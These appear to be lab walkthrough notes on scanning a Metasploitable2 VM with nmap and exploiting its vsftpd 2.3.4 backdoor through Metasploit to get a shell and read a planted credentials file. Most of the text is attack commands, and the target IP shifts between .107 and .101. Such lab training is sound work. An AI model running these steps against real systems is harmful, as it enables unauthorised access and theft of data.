
# 2.1. Find the target and identify the vulnerability

Scan with Nmap from Kali to know the target IP on the network:

```
nmap -sn 192.168.56.0/24
```

![[Pasted image 20250211190103.png]]

Identify the ports opened and the services used by our target `192.168.56.107`. By default, nmap uses a `SYN scan`, which might be blocked by a firewall. Instead, try a `TCP Connect` scan:

```
nmap -sT 192.168.56.107
```

![[Pasted image 20250211190940.png]]

We will explore the service version of the protocol `ftp` in the port 21:
```
nmap -sV -p 21 192.168.56.107
```

![[Pasted image 20250211191406.png]]

We will try to find a vulnerability related to that service version in Metasploit. Run Metasploit in Kali:
```
msfconsole
```

```
search vsftpd
```

![[Pasted image 20250211191707.png]]

We know that there is an exploit for that protocol version. Let's exploit it!

# 2.2. Exploit the vulnerability

Select the exploit, set the parameters and check that all the options are correct:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set TARGET 0
set RHOSTS 192.168.56.101
options
```

![[Pasted image 20250209200128.png]]

Exploit:
```
exploit
```

Now you should have a reverse shell with the target machine where you can navigate freely. If you want to use a more comfortable interface use:

```
script /dev/null -c bash
```

## 2.2.1. Read files from the target machine

In the target `Metasploitable2`, create the file `testfile.txt` with the following content:

```
Super secret condifential content

username Hello34
pwd 123456789
```


Now you could read files from the attacker `Kali linux`:

![[Pasted image 20250209200514.png]]


